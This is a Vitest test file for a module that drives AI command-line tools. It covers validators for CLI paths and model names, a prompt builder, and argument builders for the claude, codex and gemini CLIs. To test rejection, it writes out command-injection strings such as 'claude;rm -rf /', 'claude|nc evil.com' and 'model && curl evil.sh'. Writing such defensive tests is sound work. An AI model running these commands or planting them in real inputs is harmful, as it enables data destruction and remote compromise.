import { describe, it, expect } from "vitest";
import { isSafeCliPath, isSafeModelName, buildPrompt, buildArgs } from "../../providers/cli";

describe("isSafeCliPath", () => {
  it("accepts empty string (use PATH default)", () => {
    expect(isSafeCliPath("")).toBe(true);
  });

  it("accepts plain absolute paths", () => {
    expect(isSafeCliPath("/usr/local/bin/claude")).toBe(true);
    expect(isSafeCliPath("C:\\Users\\me\\bin\\claude.exe")).toBe(false); // backslash is metachar
  });

  it("rejects paths with spaces", () => {
    expect(isSafeCliPath("/Applications/My CLI/claude")).toBe(false);
    expect(isSafeCliPath("claude --hack")).toBe(false);
  });

  it("rejects shell metacharacters", () => {
    expect(isSafeCliPath("claude & calc.exe")).toBe(false);
    expect(isSafeCliPath("claude;rm -rf /")).toBe(false);
    expect(isSafeCliPath("claude|nc evil.com")).toBe(false);
    expect(isSafeCliPath("claude`whoami`")).toBe(false);
    expect(isSafeCliPath("claude$HOME")).toBe(false);
    expect(isSafeCliPath("claude>out")).toBe(false);
    expect(isSafeCliPath("claude<in")).toBe(false);
    expect(isSafeCliPath('claude"foo"')).toBe(false);
    expect(isSafeCliPath("claude'foo'")).toBe(false);
    expect(isSafeCliPath("claude(foo)")).toBe(false);
    expect(isSafeCliPath("claude{foo}")).toBe(false);
    expect(isSafeCliPath("claude[foo]")).toBe(false);
  });

  it("rejects extreme lengths", () => {
    expect(isSafeCliPath("a".repeat(261))).toBe(false);
    expect(isSafeCliPath("a".repeat(260))).toBe(true);
  });

  it("rejects non-string input", () => {
    expect(isSafeCliPath(null as unknown as string)).toBe(false);
    expect(isSafeCliPath(undefined as unknown as string)).toBe(false);
  });
});

describe("isSafeModelName", () => {
  it("accepts empty (use CLI default)", () => {
    expect(isSafeModelName("")).toBe(true);
  });

  it("accepts realistic model names", () => {
    expect(isSafeModelName("claude-sonnet-4-6")).toBe(true);
    expect(isSafeModelName("gpt-4o")).toBe(true);
    expect(isSafeModelName("gemini-2.0-flash-lite")).toBe(true);
    expect(isSafeModelName("llama3.2")).toBe(true);
    expect(isSafeModelName("anthropic/claude-sonnet")).toBe(true);
    expect(isSafeModelName("ollama:llama3:8b")).toBe(true);
  });

  it("rejects shell metacharacters", () => {
    expect(isSafeModelName("model && curl evil.sh")).toBe(false);
    expect(isSafeModelName("model;rm -rf")).toBe(false);
    expect(isSafeModelName("model$(whoami)")).toBe(false);
    expect(isSafeModelName("model spaces")).toBe(false);
    expect(isSafeModelName("model|nc")).toBe(false);
  });

  it("rejects overlong names", () => {
    expect(isSafeModelName("a".repeat(81))).toBe(false);
    expect(isSafeModelName("a".repeat(80))).toBe(true);
  });

  it("rejects non-string input", () => {
    expect(isSafeModelName(null as unknown as string)).toBe(false);
  });
});

describe("buildPrompt", () => {
  it("wraps system prompt in <system> tags", () => {
    const out = buildPrompt({ systemPrompt: "you are a poet", userMessage: "haiku" });
    expect(out).toContain("<system>\nyou are a poet\n</system>");
    expect(out).toContain("Human: haiku");
  });

  it("renders multi-turn history with Human/Assistant tags", () => {
    const out = buildPrompt({
      systemPrompt: "sys",
      messages: [
        { role: "user", content: "first" },
        { role: "assistant", content: "reply" },
        { role: "user", content: "second" },
      ],
    });
    expect(out).toContain("Human: first");
    expect(out).toContain("Assistant: reply");
    expect(out).toContain("Human: second");
    expect(out.indexOf("Human: first")).toBeLessThan(out.indexOf("Assistant: reply"));
  });

  it("omits the user line when neither userMessage nor messages is provided", () => {
    const out = buildPrompt({ systemPrompt: "sys" });
    expect(out).toContain("<system>");
    expect(out).not.toMatch(/Human:|Assistant:/);
  });

  it("prefers messages over userMessage when both are given", () => {
    const out = buildPrompt({
      systemPrompt: "sys",
      userMessage: "ignored",
      messages: [{ role: "user", content: "kept" }],
    });
    expect(out).toContain("Human: kept");
    expect(out).not.toContain("ignored");
  });

  it("omits system block when systemPrompt is empty", () => {
    const out = buildPrompt({ systemPrompt: "", userMessage: "hi" });
    expect(out).not.toContain("<system>");
    expect(out).toContain("Human: hi");
  });
});

describe("buildArgs", () => {
  it("claude-cli passes -p and --output-format text", () => {
    const args = buildArgs("claude-cli", "");
    expect(args).toEqual(["-p", "--output-format", "text"]);
  });

  it("claude-cli appends --model when set", () => {
    const args = buildArgs("claude-cli", "sonnet");
    expect(args).toContain("--model");
    expect(args[args.indexOf("--model") + 1]).toBe("sonnet");
  });

  it("codex-cli uses exec + sandbox read-only + json", () => {
    const args = buildArgs("codex-cli", "gpt-5");
    expect(args[0]).toBe("exec");
    expect(args).toContain("--skip-git-repo-check");
    expect(args).toContain("--json");
    expect(args).toContain("--sandbox");
    expect(args[args.indexOf("--sandbox") + 1]).toBe("read-only");
    expect(args).toContain("--model");
    expect(args[args.indexOf("--model") + 1]).toBe("gpt-5");
  });

  it("codex-cli omits --model when empty", () => {
    const args = buildArgs("codex-cli", "");
    expect(args).not.toContain("--model");
  });

  it("gemini-cli passes -p", () => {
    const args = buildArgs("gemini-cli", "gemini-2.5-pro");
    expect(args[0]).toBe("-p");
    expect(args).toContain("--model");
    expect(args[args.indexOf("--model") + 1]).toBe("gemini-2.5-pro");
  });
});
